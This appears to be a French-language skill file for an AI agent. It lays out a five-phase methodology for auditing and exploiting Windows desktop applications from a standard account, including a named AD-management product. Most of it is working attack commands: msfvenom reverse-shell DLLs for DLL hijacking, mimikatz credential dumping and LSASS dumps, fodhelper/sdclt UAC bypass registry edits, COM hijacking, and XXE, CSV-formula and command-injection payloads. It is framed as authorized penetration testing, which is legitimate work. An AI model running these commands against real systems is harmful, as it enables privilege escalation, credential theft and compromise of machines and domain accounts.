---
name: WindowsDesktopAudit
description: "Audit et exploitation d'applications desktop Windows en black-box depuis un compte utilisateur non-admin. Privesc, DLL hijacking, credentials, IPC, UAC bypass."
version: 1.0.0
author: Hermes Agent
license: MIT
platforms: [linux]
metadata:
  hermes:
    tags: [Security, Windows, Privesc, DLLHijacking, UAC, BlackBox]
    triggers:
      - "Audit d'une app Windows"
      - "Privesc Windows"
      - "DLL hijacking"
      - "Audit application desktop"
    prerequisites:
      - "VM Windows (VirtualBox ou similaire)"
      - "Accès à la VM via VBoxManage ou SSH/WinRM"
---

# Windows Desktop Application Audit

Audit et exploitation d'une application desktop Windows depuis un compte utilisateur non-admin, en black-box (pas de code source).

## Méthodologie (5 phases)

### Phase 1 — Recon
```cmd
whoami /all
systeminfo
net localgroup administrators
wmic product where "name like '%TARGET%'" get Name,InstallLocation,Version
dir /s /b "C:\Program Files\TARGET"
```

### Phase 2 — Vuln Detection
```cmd
# Outils automatisés
winPEAS.exe
Seatbelt.exe -group=all
powershell -ep bypass -c ". .\PowerUp.ps1; Invoke-AllChecks"
SharpUp.exe audit

# Checks manuels
accesschk.exe -uwdqs "Users" "C:\Program Files\" -accepteula
accesschk.exe -uwcqv "Users" * -accepteula
accesschk.exe -uwcqv "Users" HKLM\ -accepteula
schtasks /query /fo LIST /v
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```

### Phase 3 — Exploitation
Techniques par condition (voir tableau récapitulatif):
- Service modifiable → sc config binpath + restart
- Unquoted path → placer exe dans path intermédiaire
- DLL hijacking → Procmon identifier + msfvenom DLL + placer
- AlwaysInstallElevated → msfvenom MSI + msiexec
- SeImpersonate → PrintSpoofer/GodPotato
- UAC bypass (si dans admin group) → fodhelper/sdclt

### Phase 4 — Post-exploitation
```cmd
mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit"
procdump.exe -accepteula -ma lsass.exe lsass.dmp
hashcat -m 1000 hashes.txt wordlist.txt
```

### Phase 5 — Reporting
Chaque finding: ID, titre, sévérité, fichier/endpoint, preuve, impact, correction.

## Techniques clés

### Services
- Weak permissions: `accesschk -uwcqv "Users" *` → `sc config binpath=`
- Unquoted paths: `wmic service get name,pathname` → placer exe
- DLL via services: Procmon NAME NOT FOUND → placer DLL

### DLL Hijacking
1. Procmon: filtre Process Name + *.dll + NAME NOT FOUND
2. msfvenom -p windows/x64/shell_reverse_tcp -f dll -o <name>.dll
3. Placer dans dossier app → lancer app

### Stored Credentials
- Config: `findstr /si /r "password|pwd|credential" *.config *.xml *.ini`
- DPAPI: `mimikatz "dpapi::masterkey"` / `SharpDPAPI.exe`
- Credential Manager: `cmdkey /list` / `mimikatz "vault::cred"`
- Registry: `reg query "HKLM\...\Winlogon" /v DefaultPassword`
- LSASS: `procdump -ma lsass.exe` → `mimikatz "sekurlsa::minidump"`

### IPC Abuse
- Named pipe: PrintSpoofer crée pipe → SYSTEM connecte → impersonate
- COM hijacking: `reg add "HKCU\Software\Classes\CLSID\{...}\InProcServer32"`
- DCOM: MMC20.Application.ExecuteShellCommand

### UAC Bypass (prérequis: user dans admin group)
- fodhelper: `reg add HKCU\Software\Classes\ms-settings\Shell\Open\command` → `fodhelper.exe`
- sdclt: `reg add HKCU\Software\Classes\exefile\shell\open\command` → `sdclt.exe`
- UACMe: 80+ méthodes

### Import File Injection
- XXE: `<!ENTITY xxe SYSTEM "file:///C:/Windows/win.ini">`
- CSV: `=cmd|'/c calc.exe'!A1`
- Command: `;net localgroup administrators <user> /add`

## Outils à installer sur la VM

| Outil | Usage |
|-------|-------|
| Sysinternals Suite | Procmon, accesschk, AutoRuns, PsExec, Procdump |
| PowerUp / SharpUp | Checks LPE automatiques |
| Seatbelt | Énumération config |
| WinPEAS | Scan tout-en-un |
| msfvenom | Génération payloads (depuis hôte Linux) |
| PrintSpoofer/GodPotato | Exploit SeImpersonate |
| Process Hacker | Inspection runtime |
| dnSpy | Reverse .NET assemblies |
| Wireshark | Capture réseau (LDAP en clair?) |

## Axes spécifiques pour apps de gestion AD (type KoXo)

1. Permissions dossier install: `icacls "C:\Program Files\KoXo" /T`
2. DLL hijacking: Procmon au lancement
3. Config credentials: findstr password|ldap|domain dans config files
4. Import CSV/XML: tester XXE, CSV injection, command injection
5. .NET reverse: dnSpy → hardcoded creds, LDAP logic
6. Service/scheduled tasks: `sc query | findstr koxo`
7. Network: Wireshark pendant usage (LDAP 389 non chiffré?)

## Tableau récapitulatif

| Technique | Condition | Outil |
|-----------|-----------|-------|
| Service modifiable | ACL write sur service/bin | accesschk, PowerUp |
| Unquoted path | Path avec espaces non quoté | wmic, PowerUp |
| DLL hijacking | DLL manquante + dossier writable | Procmon, msfvenom |
| Scheduled task | Task as SYSTEM + bin writable | schtasks |
| AlwaysInstallElevated | Reg key = 1 (HKCU+HKLM) | reg query, msfvenom |
| SeImpersonate | Priv in whoami /priv | PrintSpoofer, GodPotato |
| SeDebug | Priv in whoami /priv | procdump, mimikatz |
| UAC bypass | User in admin group, UAC on | fodhelper, sdclt |
| COM hijacking | HKCU\Classes writable | reg add, Autoruns |
| Credentials config | Config files lisible | findstr |
| DPAPI | Accès master key | mimikatz, SharpDPAPI |
| CSV/XXE injection | App import CSV/XML | payload craft |

## Pitfalls
- **Toujours faire l'audit depuis un compte utilisateur standard**, pas admin — sinon les findings ne reflètent pas le risque réel.
- **Procmon génère énormément de données** — toujours configurer les filtres avant de lancer l'app.
- **SafeDllSearchMode** (actif par défaut) déplace CWD après System32 — vérifier sa valeur avant d'exploiter DLL hijacking via CWD.
- **Les binaires signés** peuvent être requis pour certains UAC bypass — vérifier avec sigcheck.
- **msfvenom payloads stageless** (`shell_reverse_tcp`) sont plus fiables que staged (`meterpreter/reverse_tcp`) sur VMs isolées.
- **dnSpy** ne fonctionne que sur les assemblies .NET — pas sur le code natif (C/C++). Pour le natif, utiliser Ghidra ou IDA.
- **Avant de remplacer un binaire de service**, toujours sauvegarder l'original pour pouvoir restaurer.
